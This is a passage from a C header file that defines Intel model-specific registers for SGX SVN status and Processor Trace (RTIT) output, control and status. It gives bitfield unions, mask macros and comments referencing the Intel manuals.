 * faulting Intel SGX instruction has been executed, and evaluate the suitability of the Intel SGX
 * SVN value of any ACM that is expected to be launched by the OS or the VMM.
 *
 * @remarks If CPUID.(EAX=07H, ECX=0H): EBX[2] = 1
 * @see Vol3D[41.11.3(Interactions with Authenticated Code Modules (ACMs))] (reference)
 */
#define IA32_SGX_SVN_STATUS 0x00000500
typedef union {
  struct {
    /**
     * [Bit 0] - If 1, indicates that a non-faulting Intel SGX instruction has been executed,
     * consequently, launching a properly signed ACM but with Intel SGX SVN value less than the BIOS
     * specified Intel SGX SVN threshold would lead to an TXT shutdown.
     * - If 0, indicates that the processor will allow a properly signed ACM to launch irrespective
     * of the Intel SGX SVN value of the ACM.
     *
     * @see Vol3D[41.11.3(Interactions with Authenticated Code Modules (ACMs))]
     */
    UINT64 Lock : 1;
#define IA32_SGX_SVN_STATUS_LOCK_BIT 0
#define IA32_SGX_SVN_STATUS_LOCK_FLAG 0x01
#define IA32_SGX_SVN_STATUS_LOCK_MASK 0x01
#define IA32_SGX_SVN_STATUS_LOCK(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 15;

    /**
     * @brief Reflects the expected threshold of Intel SGX SVN for the SINIT ACM
     *
     * [Bits 23:16] - If CPUID.01H:ECX.SMX = 1, this field reflects the expected threshold of Intel
     * SGX SVN for the SINIT ACM.
     * - If CPUID.01H:ECX.SMX = 0, this field is reserved (0).
     *
     * @see Vol3D[41.11.3(Interactions with Authenticated Code Modules (ACMs))]
     */
    UINT64 SgxSvnSinit : 8;
#define IA32_SGX_SVN_STATUS_SGX_SVN_SINIT_BIT 16
#define IA32_SGX_SVN_STATUS_SGX_SVN_SINIT_FLAG 0xFF0000
#define IA32_SGX_SVN_STATUS_SGX_SVN_SINIT_MASK 0xFF
#define IA32_SGX_SVN_STATUS_SGX_SVN_SINIT(_) (((_) >> 16) & 0xFF)
    UINT64 Reserved2 : 40;
  };

  UINT64 Flags;
} IA32_SGX_SVN_STATUS_REGISTER;

/**
 * Trace Output Base Register.
 *
 * @remarks If ( (CPUID.(EAX=07H, ECX=0):EBX[25] = 1) && ( (CPUID.(EAX=14H,ECX=0): ECX[0] = 1) ||
 *          (CPUID.(EAX=14H,ECX=0):ECX[2] = 1) ) )
 * @see Vol3C[35.2.7.7(IA32_RTIT_OUTPUT_BASE MSR)] (reference)
 */
#define IA32_RTIT_OUTPUT_BASE 0x00000560
typedef union {
  struct {
    UINT64 Reserved1 : 7;

    /**
     * @brief Base physical address
     *
     * [Bits 47:7] The base physical address. How this address is used depends on the value of
     * IA32_RTIT_CTL.ToPA:
     * - 0: This is the base physical address of a single, contiguous physical output region. This
     * could be mapped to DRAM or to MMIO, depending on the value. The base address should be
     * aligned with the size of the region, such that none of the 1s in the mask value overlap with
     * 1s in the base address. If the base is not aligned, an operational error will result.
     * - 1: The base physical address of the current ToPA table. The address must be 4K aligned.
     * Writing an address in which bits 11:7 are non-zero will not cause a \#GP, but an operational
     * error will be signaled once TraceEn is set.
     *
     * @see Vol3C[35.2.7.8(IA32_RTIT_OUTPUT_MASK_PTRS MSR)]
     * @see Vol3C[35.3.9(Operational Errors)]
     * @see Vol3C[35.2.6.2(Table of Physical Addresses (ToPA))]
     */
    UINT64 BasePhysicalAddress : 41;
#define IA32_RTIT_OUTPUT_BASE_BASE_PHYSICAL_ADDRESS_BIT 7
#define IA32_RTIT_OUTPUT_BASE_BASE_PHYSICAL_ADDRESS_FLAG 0xFFFFFFFFFF80
#define IA32_RTIT_OUTPUT_BASE_BASE_PHYSICAL_ADDRESS_MASK 0x1FFFFFFFFFF
#define IA32_RTIT_OUTPUT_BASE_BASE_PHYSICAL_ADDRESS(_) (((_) >> 7) & 0x1FFFFFFFFFF)
    UINT64 Reserved2 : 16;
  };

  UINT64 Flags;
} IA32_RTIT_OUTPUT_BASE_REGISTER;

/**
 * Trace Output Mask Pointers Register.
 *
 * @remarks If ( (CPUID.(EAX=07H, ECX=0):EBX[25] = 1) && ( (CPUID.(EAX=14H,ECX=0):ECX[0] = 1) ||
 *          (CPUID.(EAX=14H,ECX=0):ECX[2] = 1) ) )
 * @see Vol3C[35.2.7.8(IA32_RTIT_OUTPUT_MASK_PTRS MSR)] (reference)
 */
#define IA32_RTIT_OUTPUT_MASK_PTRS 0x00000561
typedef union {
  struct {
    /**
     * [Bits 6:0] Forced to 1, writes are ignored.
     */
    UINT64 LowerMask : 7;
#define IA32_RTIT_OUTPUT_MASK_PTRS_LOWER_MASK_BIT 0
#define IA32_RTIT_OUTPUT_MASK_PTRS_LOWER_MASK_FLAG 0x7F
#define IA32_RTIT_OUTPUT_MASK_PTRS_LOWER_MASK_MASK 0x7F
#define IA32_RTIT_OUTPUT_MASK_PTRS_LOWER_MASK(_) (((_) >> 0) & 0x7F)

    /**
     * @brief MaskOrTableOffset
     *
     * [Bits 31:7] The use of this field depends on the value of IA32_RTIT_CTL.ToPA:
     * - 0: This field holds bits 31:7 of the mask value for the single, contiguous physical output
     * region. The size of this field indicates that regions can be of size 128B up to 4GB. This
     * value (combined with the lower 7 bits, which are reserved to 1) will be ANDed with the
     * OutputOffset field to determine the next write address. All 1s in this field should be
     * consecutive and starting at bit 7, otherwise the region will not be contiguous, and an
     * operational error will be signaled when TraceEn is set.
     * - 1: This field holds bits 27:3 of the offset pointer into the current ToPA table. This value
     * can be added to the IA32_RTIT_OUTPUT_BASE value to produce a pointer to the current ToPA
     * table entry, which itself is a pointer to the current output region. In this scenario, the
     * lower 7 reserved bits are ignored. This field supports tables up to 256 MBytes in size.
     *
     * @see Vol3C[35.3.9(Operational Errors)]
     */
    UINT64 MaskOrTableOffset : 25;
#define IA32_RTIT_OUTPUT_MASK_PTRS_MASK_OR_TABLE_OFFSET_BIT 7
#define IA32_RTIT_OUTPUT_MASK_PTRS_MASK_OR_TABLE_OFFSET_FLAG 0xFFFFFF80
#define IA32_RTIT_OUTPUT_MASK_PTRS_MASK_OR_TABLE_OFFSET_MASK 0x1FFFFFF
#define IA32_RTIT_OUTPUT_MASK_PTRS_MASK_OR_TABLE_OFFSET(_) (((_) >> 7) & 0x1FFFFFF)

    /**
     * @brief Output Offset
     *
     * [Bits 63:32] The use of this field depends on the value of IA32_RTIT_CTL.ToPA:
     * - 0: This is bits 31:0 of the offset pointer into the single, contiguous physical output
     * region. This value will be added to the IA32_RTIT_OUTPUT_BASE value to form the physical
     * address at which the next byte of packet output data will be written. This value must be less
     * than or equal to the MaskOrTableOffset field, otherwise an operational error will be signaled
     * when TraceEn is set.
     * - 1: This field holds bits 31:0 of the offset pointer into the current ToPA output region.
     * This value will be added to the output region base field, found in the current ToPA table
     * entry, to form the physical address at which the next byte of trace output data will be
     * written. This value must be less than the ToPA entry size, otherwise an operational error
     * will be signaled when TraceEn is set.
     *
     * @see Vol3C[35.3.9(Operational Errors)]
     */
    UINT64 OutputOffset : 32;
#define IA32_RTIT_OUTPUT_MASK_PTRS_OUTPUT_OFFSET_BIT 32
#define IA32_RTIT_OUTPUT_MASK_PTRS_OUTPUT_OFFSET_FLAG 0xFFFFFFFF00000000
#define IA32_RTIT_OUTPUT_MASK_PTRS_OUTPUT_OFFSET_MASK 0xFFFFFFFF
#define IA32_RTIT_OUTPUT_MASK_PTRS_OUTPUT_OFFSET(_) (((_) >> 32) & 0xFFFFFFFF)
  };

  UINT64 Flags;
} IA32_RTIT_OUTPUT_MASK_PTRS_REGISTER;

/**
 * Trace Control Register.
 *
 * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[25] = 1)
 * @see Vol3C[35.2.7.2(IA32_RTIT_CTL MSR)] (reference)
 */
#define IA32_RTIT_CTL 0x00000570
typedef union {
  struct {
    /**
     * @brief TraceEn
     *
     * [Bit 0] If 1, enables tracing; else tracing is disabled.
     * When this bit transitions from 1 to 0, all buffered packets are flushed out of internal
     * buffers. A further store, fence, or architecturally serializing instruction may be required
     * to ensure that packet data can be observed at the trace endpoint. Note that the processor
     * will clear this bit on \#SMI (Section) and warm reset. Other MSR bits of IA32_RTIT_CTL (and
     * other trace configuration MSRs) are not impacted by these events.
     *
     * @see Vol3C[35.2.7.3(Enabling and Disabling Packet Generation with TraceEn)]
     */
    UINT64 TraceEnabled : 1;
#define IA32_RTIT_CTL_TRACE_ENABLED_BIT 0
#define IA32_RTIT_CTL_TRACE_ENABLED_FLAG 0x01
#define IA32_RTIT_CTL_TRACE_ENABLED_MASK 0x01
#define IA32_RTIT_CTL_TRACE_ENABLED(_) (((_) >> 0) & 0x01)

    /**
     * @brief CYCEn
     *
     * [Bit 1] - 0: Disables CYC Packet.
     * - 1: Enables CYC Packet.
     *
     * @remarks If CPUID.(EAX=14H, ECX=0):EBX.CPSB_CAM[bit 1] = 0
     * @see Vol3C[35.4.2.14(Cycle Count (CYC) Packet)]
     */
    UINT64 CycEnabled : 1;
#define IA32_RTIT_CTL_CYC_ENABLED_BIT 1
#define IA32_RTIT_CTL_CYC_ENABLED_FLAG 0x02
#define IA32_RTIT_CTL_CYC_ENABLED_MASK 0x01
#define IA32_RTIT_CTL_CYC_ENABLED(_) (((_) >> 1) & 0x01)

    /**
     * @brief OS
     *
     * [Bit 2] - 0: Packet generation is disabled when CPL = 0.
     * - 1: Packet generation may be enabled when CPL = 0.
     */
    UINT64 Os : 1;
#define IA32_RTIT_CTL_OS_BIT 2
#define IA32_RTIT_CTL_OS_FLAG 0x04
#define IA32_RTIT_CTL_OS_MASK 0x01
#define IA32_RTIT_CTL_OS(_) (((_) >> 2) & 0x01)

    /**
     * @brief User
     *
     * [Bit 3] - 0: Packet generation is disabled when CPL > 0.
     * - 1: Packet generation may be enabled when CPL > 0.
     */
    UINT64 User : 1;
#define IA32_RTIT_CTL_USER_BIT 3
#define IA32_RTIT_CTL_USER_FLAG 0x08
#define IA32_RTIT_CTL_USER_MASK 0x01
#define IA32_RTIT_CTL_USER(_) (((_) >> 3) & 0x01)

    /**
     * @brief PwrEvtEn
     *
     * [Bit 4] - 0: Power Event Trace packets are disabled.
     * - 1: Power Event Trace packets are enabled.
     *
     * @see Vol3C[35.2.3(Power Event Tracing)]
     */
    UINT64 PowerEventTraceEnabled : 1;
#define IA32_RTIT_CTL_POWER_EVENT_TRACE_ENABLED_BIT 4
#define IA32_RTIT_CTL_POWER_EVENT_TRACE_ENABLED_FLAG 0x10
#define IA32_RTIT_CTL_POWER_EVENT_TRACE_ENABLED_MASK 0x01
#define IA32_RTIT_CTL_POWER_EVENT_TRACE_ENABLED(_) (((_) >> 4) & 0x01)

    /**
     * @brief FUPonPTW
     *
     * [Bit 5] - 0: PTW packets are not followed by FUPs.
     * - 1: PTW packets are followed by FUPs.
     */
    UINT64 FupOnPtw : 1;
#define IA32_RTIT_CTL_FUP_ON_PTW_BIT 5
#define IA32_RTIT_CTL_FUP_ON_PTW_FLAG 0x20
#define IA32_RTIT_CTL_FUP_ON_PTW_MASK 0x01
#define IA32_RTIT_CTL_FUP_ON_PTW(_) (((_) >> 5) & 0x01)

    /**
     * @brief FabricEn
     *
     * [Bit 6] - 0: Trace output is directed to the memory subsystem, mechanism depends on
     * IA32_RTIT_CTL.ToPA.
     * - 1: Trace output is directed to the trace transport subsystem, IA32_RTIT_CTL.ToPA is
     * ignored.
     *
     * @remarks If (CPUID.(EAX=07H, ECX=0):ECX[3] = 1) Reserved if CPUID.(EAX=14H, ECX=0):ECX[bit 3]
     * = 0
     */
    UINT64 FabricEnabled : 1;
#define IA32_RTIT_CTL_FABRIC_ENABLED_BIT 6
#define IA32_RTIT_CTL_FABRIC_ENABLED_FLAG 0x40
#define IA32_RTIT_CTL_FABRIC_ENABLED_MASK 0x01
#define IA32_RTIT_CTL_FABRIC_ENABLED(_) (((_) >> 6) & 0x01)

    /**
     * @brief CR3 filter
     *
     * [Bit 7] - 0: Disables CR3 filtering.
     * - 1: Enables CR3 filtering.
     */
    UINT64 Cr3Filter : 1;
#define IA32_RTIT_CTL_CR3_FILTER_BIT 7
#define IA32_RTIT_CTL_CR3_FILTER_FLAG 0x80
#define IA32_RTIT_CTL_CR3_FILTER_MASK 0x01
#define IA32_RTIT_CTL_CR3_FILTER(_) (((_) >> 7) & 0x01)

    /**
     * @brief ToPA
     *
     * [Bit 8] - 0: Single-range output scheme enabled.
     * - 1: ToPA output scheme enabled.
     *
     * @remarks 0: If CPUID.(EAX=14H, ECX=0):ECX.SNGLRGNOUT[bit 2] = 1 and IA32_RTIT_CTL.FabricEn=0
     * 1: If CPUID.(EAX=14H, ECX=0):ECX.TOPA[bit 0] = 1, and IA32_RTIT_CTL.FabricEn=0 WRMSR to
     * IA32_RTIT_CTL that sets TraceEn but clears this bit and FabricEn would cause \#GP: If
     * CPUID.(EAX=14H, ECX=0):ECX.SNGLRGNOUT[bit 2] = 0 WRMSR to IA32_RTIT_CTL that sets this bit
     * causes \#GP: If CPUID.(EAX=14H, ECX=0):ECX.TOPA[bit 0] = 0
     * @see Vol3C[35.2.6.2(Table of Physical Addresses (ToPA))]
     */
    UINT64 Topa : 1;
#define IA32_RTIT_CTL_TOPA_BIT 8
#define IA32_RTIT_CTL_TOPA_FLAG 0x100
#define IA32_RTIT_CTL_TOPA_MASK 0x01
#define IA32_RTIT_CTL_TOPA(_) (((_) >> 8) & 0x01)

    /**
     * @brief MTCEn
     *
     * [Bit 9] - 0: Disables MTC Packet.
     * - 1: Enables MTC Packet.
     *
     * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[3] = 1) Reserved if CPUID.(EAX=14H,
     * ECX=0):EBX.MTC[bit 3] = 0
     * @see Vol3C[35.4.2.16(Overflow (OVF) Packet)]
     */
    UINT64 MtcEnabled : 1;
#define IA32_RTIT_CTL_MTC_ENABLED_BIT 9
#define IA32_RTIT_CTL_MTC_ENABLED_FLAG 0x200
#define IA32_RTIT_CTL_MTC_ENABLED_MASK 0x01
#define IA32_RTIT_CTL_MTC_ENABLED(_) (((_) >> 9) & 0x01)

    /**
     * @brief TSCEn
     *
     * [Bit 10] - 0: Disable TSC packets.
     * - 1: Enable TSC packets.
     *
     * @see Vol3C[35.4.2.11(Timestamp Counter (TSC) Packet)]
     */
    UINT64 TscEnabled : 1;
#define IA32_RTIT_CTL_TSC_ENABLED_BIT 10
#define IA32_RTIT_CTL_TSC_ENABLED_FLAG 0x400
#define IA32_RTIT_CTL_TSC_ENABLED_MASK 0x01
#define IA32_RTIT_CTL_TSC_ENABLED(_) (((_) >> 10) & 0x01)

    /**
     * @brief DisRETC
     *
     * [Bit 11] - 0: Enable RET compression.
     * - 1: Disable RET compression.
     *
     * @see Vol3C[35.2.1.2(Indirect Transfer COFI)]
     */
    UINT64 RetCompressionDisabled : 1;
#define IA32_RTIT_CTL_RET_COMPRESSION_DISABLED_BIT 11
#define IA32_RTIT_CTL_RET_COMPRESSION_DISABLED_FLAG 0x800
#define IA32_RTIT_CTL_RET_COMPRESSION_DISABLED_MASK 0x01
#define IA32_RTIT_CTL_RET_COMPRESSION_DISABLED(_) (((_) >> 11) & 0x01)

    /**
     * @brief PTWEn
     *
     * [Bit 12] - 0: PTWRITE packet generation disabled.
     * - 1: PTWRITE packet generation enabled.
     */
    UINT64 PtwEnabled : 1;
#define IA32_RTIT_CTL_PTW_ENABLED_BIT 12
#define IA32_RTIT_CTL_PTW_ENABLED_FLAG 0x1000
#define IA32_RTIT_CTL_PTW_ENABLED_MASK 0x01
#define IA32_RTIT_CTL_PTW_ENABLED(_) (((_) >> 12) & 0x01)

    /**
     * @brief BranchEn
     *
     * [Bit 13] - 0: Disable COFI-based packets.
     * - 1: Enable COFI-based packets: FUP, TIP, TIP.PGE, TIP.PGD, TNT, MODE.Exec, MODE.TSX.
     *
     * @see Vol3C[35.2.5.4(Branch Enable (BranchEn))]
     */
    UINT64 BranchEnabled : 1;
#define IA32_RTIT_CTL_BRANCH_ENABLED_BIT 13
#define IA32_RTIT_CTL_BRANCH_ENABLED_FLAG 0x2000
#define IA32_RTIT_CTL_BRANCH_ENABLED_MASK 0x01
#define IA32_RTIT_CTL_BRANCH_ENABLED(_) (((_) >> 13) & 0x01)

    /**
     * @brief MTCFreq
     *
     * [Bits 17:14] Defines MTC packet Frequency, which is based on the core crystal clock, or
     * Always Running Timer (ART). MTC will be sent each time the selected ART bit toggles. The
     * following Encodings are defined: 0: ART(0), 1: ART(1), 2: ART(2), 3: ART(3), 4: ART(4), 5:
     * ART(5), 6: ART(6), 7: ART(7), 8: ART(8), 9: ART(9), 10: ART(10), 11: ART(11), 12: ART(12),
     * 13: ART(13), 14: ART(14), 15: ART(15)
     *
     * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[3] = 1) Reserved if CPUID.(EAX=14H,
     * ECX=0):EBX.MTC[bit 3] = 0
     * @see Vol3C[35.3.1(Detection of Intel Processor Trace and Capability Enumeration)]
     */
    UINT64 MtcFrequency : 4;
#define IA32_RTIT_CTL_MTC_FREQUENCY_BIT 14
#define IA32_RTIT_CTL_MTC_FREQUENCY_FLAG 0x3C000
#define IA32_RTIT_CTL_MTC_FREQUENCY_MASK 0x0F
#define IA32_RTIT_CTL_MTC_FREQUENCY(_) (((_) >> 14) & 0x0F)
    UINT64 Reserved1 : 1;

    /**
     * @brief CYCThresh
     *
     * [Bits 22:19] CYC packet threshold. CYC packets will be sent with the first eligible packet
     * after N cycles have passed since the last CYC packet. If CycThresh is 0 then N=0, otherwise N
     * is defined as 2(CycThresh-1). The following Encodings are defined: 0: 0, 1: 1, 2: 2, 3: 4, 4:
     * 8, 5: 16, 6: 32, 7: 64, 8: 128, 9: 256, 10: 512, 11: 1024, 12: 2048, 13: 4096, 14: 8192, 15:
     * 16384
     *
     * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[1] = 1) Reserved if CPUID.(EAX=14H,
     * ECX=0):EBX.CPSB_CAM[bit 1] = 0
     * @see Vol3C[35.3.6(Cycle-Accurate Mode)]
     * @see Vol3C[35.3.1(Detection of Intel Processor Trace and Capability Enumeration)]
     */
    UINT64 CycThreshold : 4;
#define IA32_RTIT_CTL_CYC_THRESHOLD_BIT 19
#define IA32_RTIT_CTL_CYC_THRESHOLD_FLAG 0x780000
#define IA32_RTIT_CTL_CYC_THRESHOLD_MASK 0x0F
#define IA32_RTIT_CTL_CYC_THRESHOLD(_) (((_) >> 19) & 0x0F)
    UINT64 Reserved2 : 1;

    /**
     * @brief PSBFreq
     *
     * [Bits 27:24] Indicates the frequency of PSB packets. PSB packet frequency is based on the
     * number of Intel PT packet bytes output, so this field allows the user to determine the
     * increment of IA32_IA32_RTIT_STATUS.PacketByteCnt that should cause a PSB to be generated.
     * Note that PSB insertion is not precise, but the average output bytes per PSB should
     * approximate the SW selected period. The following Encodings are defined:
     * 0: 2K, 1: 4K, 2: 8K, 3: 16K, 4: 32K, 5: 64K, 6: 128K, 7: 256K, 8: 512K, 9: 1M, 10: 2M, 11:
     * 4M, 12: 8M, 13: 16M, 14: 32M, 15: 64M
     *
     * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[1] = 1) Reserved if CPUID.(EAX=14H,
     * ECX=0):EBX.CPSB_CAM[bit 1] = 0
     * @see Vol3C[35.3.1(Detection of Intel Processor Trace and Capability Enumeration)]
     */
    UINT64 PsbFrequency : 4;
#define IA32_RTIT_CTL_PSB_FREQUENCY_BIT 24
#define IA32_RTIT_CTL_PSB_FREQUENCY_FLAG 0xF000000
#define IA32_RTIT_CTL_PSB_FREQUENCY_MASK 0x0F
#define IA32_RTIT_CTL_PSB_FREQUENCY(_) (((_) >> 24) & 0x0F)
    UINT64 Reserved3 : 4;

    /**
     * @brief ADDR0_CFG
     *
     * [Bits 35:32] Configures the base/limit register pair IA32_RTIT_ADDR0_A/B based on the
     * following encodings:
     * - 0: ADDR0 range unused.
     * - 1: The [IA32_RTIT_ADDR0_A..IA32_RTIT_ADDR0_B] range defines a FilterEn range. FilterEn will
     * only be set when the IP is within this range, though other FilterEn ranges can additionally
     * be used.
     * - 2: The [IA32_RTIT_ADDR0_A..IA32_RTIT_ADDR0_B] range defines a TraceStop range. TraceStop
     * will be asserted if code branches into this range.
     * - 3..15: Reserved (\#GP).
     *
     * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > 0) Reserved if CPUID.(EAX=14H,
     * ECX=1):EBX.RANGECNT[2:0] >= 0
     * @see Vol3C[35.2.4.3(Filtering by IP)]
     * @see Vol3C[35.4.2.10(Core:Bus Ratio (CBR) Packet)]
     */
    UINT64 Addr0Cfg : 4;
#define IA32_RTIT_CTL_ADDR0_CFG_BIT 32
#define IA32_RTIT_CTL_ADDR0_CFG_FLAG 0xF00000000
#define IA32_RTIT_CTL_ADDR0_CFG_MASK 0x0F
#define IA32_RTIT_CTL_ADDR0_CFG(_) (((_) >> 32) & 0x0F)

    /**
     * @brief ADDR1_CFG
     *
     * [Bits 39:36] Configures the base/limit register pair IA32_RTIT_ADDR1_A/B based on the
     * following encodings:
     * - 0: ADDR1 range unused.
     * - 1: The [IA32_RTIT_ADDR1_A..IA32_RTIT_ADDR1_B] range defines a FilterEn range. FilterEn will
     * only be set when the IP is within this range, though other FilterEn ranges can additionally
     * be used.
     * - 2: The [IA32_RTIT_ADDR1_A..IA32_RTIT_ADDR1_B] range defines a TraceStop range. TraceStop
     * will be asserted if code branches into this range.
     * - 3..15: Reserved (\#GP).
     *
     * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > 1) Reserved if CPUID.(EAX=14H,
     * ECX=1):EBX.RANGECNT[2:0] < 2
     * @see Vol3C[35.2.4.3(Filtering by IP)]
     * @see Vol3C[35.4.2.10(Core:Bus Ratio (CBR) Packet)]
     */
    UINT64 Addr1Cfg : 4;
#define IA32_RTIT_CTL_ADDR1_CFG_BIT 36
#define IA32_RTIT_CTL_ADDR1_CFG_FLAG 0xF000000000
#define IA32_RTIT_CTL_ADDR1_CFG_MASK 0x0F
#define IA32_RTIT_CTL_ADDR1_CFG(_) (((_) >> 36) & 0x0F)

    /**
     * @brief ADDR2_CFG
     *
     * [Bits 43:40] Configures the base/limit register pair IA32_RTIT_ADDR2_A/B based on the
     * following encodings:
     * - 0: ADDR2 range unused.
     * - 1: The [IA32_RTIT_ADDR2_A..IA32_RTIT_ADDR2_B] range defines a FilterEn range. FilterEn will
     * only be set when the IP is within this range, though other FilterEn ranges can additionally
     * be used.
     * - 2: The [IA32_RTIT_ADDR2_A..IA32_RTIT_ADDR2_B] range defines a TraceStop range. TraceStop
     * will be asserted if code branches into this range.
     * - 3..15: Reserved (\#GP).
     *
     * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > 2) Reserved if CPUID.(EAX=14H,
     * ECX=1):EBX.RANGECNT[2:0] < 3
     * @see Vol3C[35.2.4.3(Filtering by IP)]
     * @see Vol3C[35.4.2.10(Core:Bus Ratio (CBR) Packet)]
     */
    UINT64 Addr2Cfg : 4;
#define IA32_RTIT_CTL_ADDR2_CFG_BIT 40
#define IA32_RTIT_CTL_ADDR2_CFG_FLAG 0xF0000000000
#define IA32_RTIT_CTL_ADDR2_CFG_MASK 0x0F
#define IA32_RTIT_CTL_ADDR2_CFG(_) (((_) >> 40) & 0x0F)

    /**
     * @brief ADDR3_CFG
     *
     * [Bits 47:44] Configures the base/limit register pair IA32_RTIT_ADDR3_A/B based on the
     * following encodings:
     * - 0: ADDR3 range unused.
     * - 1: The [IA32_RTIT_ADDR3_A..IA32_RTIT_ADDR3_B] range defines a FilterEn range. FilterEn will
     * only be set when the IP is within this range, though other FilterEn ranges can additionally
     * be used.
     * - 2: The [IA32_RTIT_ADDR3_A..IA32_RTIT_ADDR3_B] range defines a TraceStop range. TraceStop
     * will be asserted if code branches into this range.
     * - 3..15: Reserved (\#GP).
     *
     * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > 3) Reserved if CPUID.(EAX=14H,
     * ECX=1):EBX.RANGECNT[2:0] < 4
     * @see Vol3C[35.2.4.3(Filtering by IP)]
     * @see Vol3C[35.4.2.10(Core:Bus Ratio (CBR) Packet)]
     */
    UINT64 Addr3Cfg : 4;
#define IA32_RTIT_CTL_ADDR3_CFG_BIT 44
#define IA32_RTIT_CTL_ADDR3_CFG_FLAG 0xF00000000000
#define IA32_RTIT_CTL_ADDR3_CFG_MASK 0x0F
#define IA32_RTIT_CTL_ADDR3_CFG(_) (((_) >> 44) & 0x0F)
    UINT64 Reserved4 : 8;

    /**
     * @brief InjectPsbPmiOnEnable
     *
     * [Bit 56] - 1: Enables use of IA32_RTIT_STATUS bits PendPSB[6] and PendTopaPMI[7].
     * - 0: IA32_RTIT_STATUS bits 6 and 7 are ignored.
     *
     * @remarks Reserved if CPUID.(EAX=14H, ECX=0):EBX.INJECTPSBPMI[6] = 0
     * @see Vol3C[35.2.7.4(IA32_RTIT_STATUS MSR)]
     */
    UINT64 InjectPsbPmiOnEnable : 1;
#define IA32_RTIT_CTL_INJECT_PSB_PMI_ON_ENABLE_BIT 56
#define IA32_RTIT_CTL_INJECT_PSB_PMI_ON_ENABLE_FLAG 0x100000000000000
#define IA32_RTIT_CTL_INJECT_PSB_PMI_ON_ENABLE_MASK 0x01
#define IA32_RTIT_CTL_INJECT_PSB_PMI_ON_ENABLE(_) (((_) >> 56) & 0x01)
    UINT64 Reserved5 : 7;
  };

  UINT64 Flags;
} IA32_RTIT_CTL_REGISTER;

/**
 * Tracing Status Register.
 *
 * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[25] = 1)
 */
#define IA32_RTIT_STATUS 0x00000571
typedef union {
  struct {
    /**
     * @brief FilterEn (writes ignored)
     *
     * [Bit 0] This bit is written by the processor, and indicates that tracing is allowed for the
     * current IP. Writes are ignored.
     *
     * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[2] = 1)
     * @see Vol3C[35.2.5.5(Filter Enable (FilterEn))]
     */
    UINT64 FilterEnabled : 1;
#define IA32_RTIT_STATUS_FILTER_ENABLED_BIT 0
#define IA32_RTIT_STATUS_FILTER_ENABLED_FLAG 0x01
#define IA32_RTIT_STATUS_FILTER_ENABLED_MASK 0x01
#define IA32_RTIT_STATUS_FILTER_ENABLED(_) (((_) >> 0) & 0x01)

    /**
     * @brief ContexEn (writes ignored)
     *
     * [Bit 1] The processor sets this bit to indicate that tracing is allowed for the current
     * context. Writes are ignored.
     *
     * @see Vol3C[35.2.5.3(Context Enable (ContextEn))]
     */
    UINT64 ContextEnabled : 1;
#define IA32_RTIT_STATUS_CONTEXT_ENABLED_BIT 1
#define IA32_RTIT_STATUS_CONTEXT_ENABLED_FLAG 0x02
#define IA32_RTIT_STATUS_CONTEXT_ENABLED_MASK 0x01
#define IA32_RTIT_STATUS_CONTEXT_ENABLED(_) (((_) >> 1) & 0x01)

    /**
     * @brief TriggerEn (writes ignored)
     *
     * [Bit 2] The processor sets this bit to indicate that tracing is enabled. Writes are ignored.
     *
     * @see Vol3C[35.2.5.2(Trigger Enable (TriggerEn))]
     */
    UINT64 TriggerEnabled : 1;
#define IA32_RTIT_STATUS_TRIGGER_ENABLED_BIT 2
#define IA32_RTIT_STATUS_TRIGGER_ENABLED_FLAG 0x04
#define IA32_RTIT_STATUS_TRIGGER_ENABLED_MASK 0x01
#define IA32_RTIT_STATUS_TRIGGER_ENABLED(_) (((_) >> 2) & 0x01)
    UINT64 Reserved1 : 1;

    /**
     * @brief Error
     *
     * [Bit 4] The processor sets this bit to indicate that an operational error has been
     * encountered. When this bit is set, TriggerEn is cleared to 0 and packet generation is
     * disabled. When TraceEn is cleared, software can write this bit. Once it is set, only software
     * can clear it. It is not recommended that software ever set this bit, except in cases where it
     * is restoring a prior saved state.
     *
     * @see Vol3C[35.2.6.2(Table of Physical Addresses (ToPA) | ToPA Errors)]
     */
    UINT64 Error : 1;
#define IA32_RTIT_STATUS_ERROR_BIT 4
#define IA32_RTIT_STATUS_ERROR_FLAG 0x10
#define IA32_RTIT_STATUS_ERROR_MASK 0x01
#define IA32_RTIT_STATUS_ERROR(_) (((_) >> 4) & 0x01)

    /**
     * @brief Stopped
     *
     * [Bit 5] The processor sets this bit to indicate that a ToPA Stop condition has been
     * encountered. When this bit is set, TriggerEn is cleared to 0 and packet generation is
     * disabled. When TraceEn is cleared, software can write this bit. Once it is set, only software
     * can clear it. It is not recommended that software ever set this bit, except in cases where it
     * is restoring a prior saved state.
     *
     * @see Vol3C[35.2.6.2(Table of Physical Addresses (ToPA) | ToPA STOP)]
     */
    UINT64 Stopped : 1;
#define IA32_RTIT_STATUS_STOPPED_BIT 5
#define IA32_RTIT_STATUS_STOPPED_FLAG 0x20
#define IA32_RTIT_STATUS_STOPPED_MASK 0x01
#define IA32_RTIT_STATUS_STOPPED(_) (((_) >> 5) & 0x01)

    /**
     * @brief Pend PSB
     *
     * [Bit 6] If IA32_RTIT_CTL.InjectPsbPmiOnEnable[56] = 1, the processor sets this bit when the
     * threshold for a PSB+ to be inserted has been reached. The processor will clear this bit when
     * the PSB+ has been inserted into the trace. If PendPSB = 1 and InjectPsbPmiOnEnable = 1 when
     * IA32_RTIT_CTL.TraceEn[0] transitions from 0 to 1, a PSB+ will be inserted into the trace.
     *
     * @remarks If CPUID.(EAX=14H, ECX=0):EBX.INJECTPSBPMI[6] = 1
     */
    UINT64 PendPsb : 1;
#define IA32_RTIT_STATUS_PEND_PSB_BIT 6
#define IA32_RTIT_STATUS_PEND_PSB_FLAG 0x40
#define IA32_RTIT_STATUS_PEND_PSB_MASK 0x01
#define IA32_RTIT_STATUS_PEND_PSB(_) (((_) >> 6) & 0x01)

    /**
     * @brief Pend ToPA PMI
     *
     * [Bit 7] If IA32_RTIT_CTL.InjectPsbPmiOnEnable[56] = 1, the processor sets this bit when the
     * threshold for a ToPA PMI to be inserted has been reached. Software should clear this bit once
